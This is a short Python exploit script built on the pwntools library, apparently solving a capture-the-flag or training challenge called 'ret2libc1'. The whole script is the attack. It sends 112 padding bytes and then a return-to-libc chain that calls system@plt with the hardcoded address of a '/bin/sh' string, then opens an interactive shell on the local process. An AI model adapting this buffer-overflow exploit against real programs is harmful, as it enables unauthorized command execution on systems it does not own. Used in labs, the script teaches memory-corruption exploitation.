#!/usr/bin/env python
from pwn import *
p = process('./ret2libc1')
bin_sh_addr = 0x08048720
system_plt = 0x08048460
payload = (
	'A' * 112 + 
	p32(system_plt) + 
	p32(0x12345678) + 
	p32(bin_sh_addr)
)
p.sendline(payload)
p.interactive()
